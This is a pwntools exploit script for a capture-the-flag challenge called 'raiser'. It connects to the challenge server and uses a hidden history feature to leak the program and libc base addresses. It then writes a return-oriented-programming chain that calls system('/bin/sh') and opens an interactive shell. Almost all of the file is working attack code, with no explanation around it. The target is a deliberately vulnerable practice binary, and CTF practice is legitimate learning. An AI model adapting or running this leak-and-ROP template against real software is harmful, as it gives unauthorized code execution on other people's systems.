from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64

file = "./raiser_patched"
args = []
io: process = None

speed = 0.1

def debug():
    gdb.attach(io, gdbscript=
    """

    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="demo-challenge.chals.io", port=443, ssl=True, sni="nopsctf-49c572abe0cf-raiser-0.chals.io") # replace sni

def launch_local():
    global file, io
    io = process([file, *args])
    debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    l = launch_remote
    l()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1: a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1: b_ = 0
    return d[a_+len(a):b_]

#
# exploit goes here
#

exe = ELF(file)
libc = ELF("./libc.so.6")

def exploit():
    def interact(base, power):
        sla(b"base:\n> ", str(base).encode())
        sla(b"power:\n> ", str(power).encode())
    def interact_special(base, power):
        interact(base, power)
        leak = recvu(b"Enter")
        return int(getb(leak, b"hidden History feature!\n", b"\n"))
    
    exe.address = interact_special(1337, 21) - exe.sym["main"]
    info("exe: %#018x" % exe.address)
    libc.address = interact_special(1337, 19) - 0x28150 # libc_start_main ret address
    info("libc: %#018x" % libc.address)

    for _ in range(19):
        interact(0xdeadbeef, 1)

    pop_rdi = libc.address + 0x28795
    interact(pop_rdi, 1) # rop chain
    interact(next(libc.search(b"/bin/sh\0")), 1)
    interact(libc.address + 0x54e32, 1)

    interact(1, 895642315) # big number to break out of the main loop and return

    io.interactive()
    input("end")
    exit()

launch()
exploit()
